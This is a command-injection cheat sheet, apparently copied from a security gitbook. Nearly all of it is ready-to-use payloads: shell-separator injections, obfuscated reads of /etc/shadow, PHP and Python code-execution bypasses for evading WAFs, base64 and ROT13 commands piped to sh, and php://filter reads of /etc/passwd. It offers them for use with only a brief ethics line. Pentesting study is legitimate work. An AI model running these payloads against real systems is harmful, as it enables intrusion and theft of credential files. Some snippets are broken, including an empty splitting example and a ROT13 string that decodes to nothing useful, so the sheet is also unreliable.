إليك تنظيم النقاط بشكل نصي عادي ومنظم:

---

### **Command Injection Techniques**

#### **1. Testing in Links**
- **Email Command Injection**:
  ```bash
  $command@mailbox.com
  `$command`@mailbox.com
  `command`@mailbox.com
  ```

#### **2. Parameter Found in JavaScript**
- **Command Injection Payloads**:
  ```bash
  a);id
  a;id
  a);id;
  a;id;
  a);id|
  a;id|
  a)|id
  a|id
  a)|id;
  a|id
  |/bin/ls -al
  a);/usr/bin/id
  a;/usr/bin/id
  cat /etc/shadow
  cat "/e"tc'/shadow'
   cat /etc/sh*dow
  cat /etc/sha``dow
  cat /etc/sha$()dow
  cat /etc/sha${}dow
  ```
# Security Bypasses for Code Execution

## PHP-Based Bypasses
- Concatenate function names: `('sys'.'tem')('cat /etc/shadow');`
- Insert comments: `system/**/('ls');`
- Use hex encoding: `'\x73\x79\x73\x74\x65\x6d'('ls');`

## Python-Based Bypasses
- Basic import bypass: `__import__('os').system('cat /etc/shadow')`
- String concatenation: `__import__('o'+'s').system('cat /etc/shadow')`
- Hex encoding: `__import__('\x6f\x73').system('cat /etc/shadow')`

## Splitting Payloads to Evade WAF
- Send parameters separately:

- The server concatenates values into: `__import__('os').system('ls')`

## Other Bypasses
- Hex encoding combined with URL encoding, followed by double URL encoding.
- Case variations (uppercase/lowercase) to bypass case-sensitive filters.
- Use of null bytes, newline characters, and escape characters.
- Testing blocked payloads to determine possible workaround methods.

## Additional Techniques
- **Encoding Tricks**  
- Base64 encoding: `echo "bHM=" | base64 -d | sh`
- ROT13: `echo "y66" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh`

- **Command Injection via Environment Variables**  
- `$(env|grep -i shell|awk -F= '{print $2}'|sh -c 'ls')`
- `$(command -v bash) -c 'ls'`

- **Indirect Execution**  
- Using `eval`: `eval("system('ls')");`
- PHP assert abuse: `assert('system("ls")');`

- **PHP Filters**  
- `php://filter/convert.base64-encode/resource=/etc/passwd`
- `php://input` to execute inline PHP code.

Always test in a controlled environment and ensure ethical hacking practices.

#### **3. JavaScript Command Injection**
- **System Command Execution**:
  ```bash
  ` ${
  @print
  (system('whoami'))} `
  ```

---

### **How to Use This Information**
1. **Email Command Injection**:
   - Test for command injection vulnerabilities in email fields by injecting commands.

2. **JavaScript Parameter Injection**:
   - Use the provided payloads to test for command injection vulnerabilities in JavaScript parameters.

3. **System Command Execution**:
   - Inject system commands in JavaScript contexts to execute arbitrary commands.

---
- https://sallam.gitbook.io/sec-88/web-appsec/command-injection

